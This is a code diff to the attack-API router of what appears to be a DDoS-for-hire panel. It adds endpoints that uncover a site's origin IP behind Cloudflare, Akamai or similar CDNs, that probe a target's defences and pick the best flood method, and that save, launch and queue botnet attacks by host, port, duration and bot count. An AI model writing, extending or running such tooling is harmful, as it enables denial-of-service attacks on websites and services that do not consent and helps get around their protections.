@@ -1,11 +1,44 @@
 from fastapi import APIRouter, Depends, HTTPException
 from uuid import UUID
+from pydantic import BaseModel
+from sqlalchemy import select
 from app.auth import get_current_user
-from app.models.all_models import User
+from app.database import async_session
+from app.models.all_models import User, AttackTemplate, AttackQueue
 from app.schemas.all_schemas import AttackCreate, AttackOut
 from app.services.attack_service import AttackService
+from app.services.ai_analysis import detect_defense, auto_select_method, get_method_scores
+from app.services.origin_discovery import discover_origin
 
 router = APIRouter(prefix="/api/attacks", tags=["attacks"])
+
+
+class DefenseDetectRequest(BaseModel):
+    target_host: str
+    target_port: int = 443
+
+
+class OriginDiscoverRequest(BaseModel):
+    domain: str
+
+
+@router.post("/origin-discover")
+async def origin_discover(data: OriginDiscoverRequest, current_user: User = Depends(get_current_user)):
+    """Find the real IP behind CDN/WAF. Bypass Cloudflare/Vietnix/Akamai."""
+    result = await discover_origin(data.domain)
+    return result
+
+
+@router.post("/detect")
+async def detect_target_defense(data: DefenseDetectRequest, current_user: User = Depends(get_current_user)):
+    """AI-powered defense detection — probes target and recommends attack method."""
+    result = await detect_defense(data.target_host, data.target_port)
+    scores = get_method_scores(result["defense_type"])
+    return {
+        **result,
+        "method_scores": {k: v for k, v in sorted(scores.items(), key=lambda x: -x[1])},
+        "best_method": result["recommended_methods"][0] if result["recommended_methods"] else "MEGA",
+    }
 
 @router.post("/launch", response_model=AttackOut)
 async def launch_attack(data: AttackCreate, current_user: User = Depends(get_current_user)):
@@ -76,3 +109,99 @@ async def my_stats(current_user: User = Depends(get_current_user)):
         "role": current_user.role,
         "username": current_user.username,
     }
+
+
+# ── Attack Templates ──
+class TemplateCreate(BaseModel):
+    name: str
+    target_host: str
+    target_port: int = 80
+    method: str = "MEGA"
+    duration_secs: int = 60
+    bot_count: int = 1
+
+class TemplateOut(BaseModel):
+    from pydantic import ConfigDict
+    model_config = ConfigDict(from_attributes=True)
+    id: UUID
+    name: str
+    target_host: str
+    target_port: int
+    method: str
+    duration_secs: int
+    bot_count: int
+
+@router.get("/templates", response_model=list[TemplateOut])
+async def list_templates(current_user: User = Depends(get_current_user)):
+    async with async_session() as s:
+        r = await s.execute(select(AttackTemplate).where(AttackTemplate.user_id == current_user.id))
+        return r.scalars().all()
+
+@router.post("/templates", response_model=TemplateOut)
+async def create_template(data: TemplateCreate, current_user: User = Depends(get_current_user)):
+    async with async_session() as s:
+        t = AttackTemplate(user_id=current_user.id, **data.model_dump())
+        s.add(t); await s.commit(); await s.refresh(t)
+        return t
+
+@router.delete("/templates/{template_id}")
+async def delete_template(template_id: UUID, current_user: User = Depends(get_current_user)):
+    async with async_session() as s:
+        t = (await s.execute(select(AttackTemplate).where(
+            AttackTemplate.id == template_id, AttackTemplate.user_id == current_user.id
+        ))).scalar_one_or_none()
+        if not t: raise HTTPException(404, "Template not found")
+        await s.delete(t); await s.commit()
+    return {"status": "deleted"}
+
+@router.post("/templates/{template_id}/launch", response_model=AttackOut)
+async def launch_template(template_id: UUID, current_user: User = Depends(get_current_user)):
+    async with async_session() as s:
+        t = (await s.execute(select(AttackTemplate).where(
+            AttackTemplate.id == template_id, AttackTemplate.user_id == current_user.id
+        ))).scalar_one_or_none()
+        if not t: raise HTTPException(404, "Template not found")
+    return await AttackService.launch(current_user, AttackCreate(
+        target_host=t.target_host, target_port=t.target_port,
+        method=t.method, duration_secs=t.duration_secs, bot_count=t.bot_count,
+    ))
+
+
+# ── Attack Queue ──
+class QueueOut(BaseModel):
+    from pydantic import ConfigDict
+    model_config = ConfigDict(from_attributes=True)
+    id: UUID
+    target_host: str
+    target_port: int
+    method: str
+    duration_secs: int
+    bot_count: int
+    status: str
+    created_at: str | None = None
+
+@router.get("/queue", response_model=list[QueueOut])
+async def list_queue(current_user: User = Depends(get_current_user)):
+    async with async_session() as s:
+        r = await s.execute(select(AttackQueue).where(
+            AttackQueue.user_id == current_user.id,
+            AttackQueue.status.in_(["queued", "running"]),
+        ).order_by(AttackQueue.created_at.desc()))
+        items = r.scalars().all()
+        return [{"id": str(i.id), "target_host": i.target_host, "target_port": i.target_port,
+                 "method": i.method, "duration_secs": i.duration_secs,
+                 "bot_count": i.bot_count, "status": i.status,
+                 "created_at": i.created_at.isoformat() if i.created_at else None} for i in items]
+
+@router.delete("/queue/{queue_id}")
+async def cancel_queue(queue_id: UUID, current_user: User = Depends(get_current_user)):
+    async with async_session() as s:
+        q = (await s.execute(select(AttackQueue).where(
+            AttackQueue.id == queue_id, AttackQueue.user_id == current_user.id
+        ))).scalar_one_or_none()
+        if not q: raise HTTPException(404, "Queue item not found")
+        if q.status == "queued":
+            await s.delete(q); await s.commit()
+        else:
+            q.status = "cancelled"; await s.commit()
+    return {"status": "cancelled"}
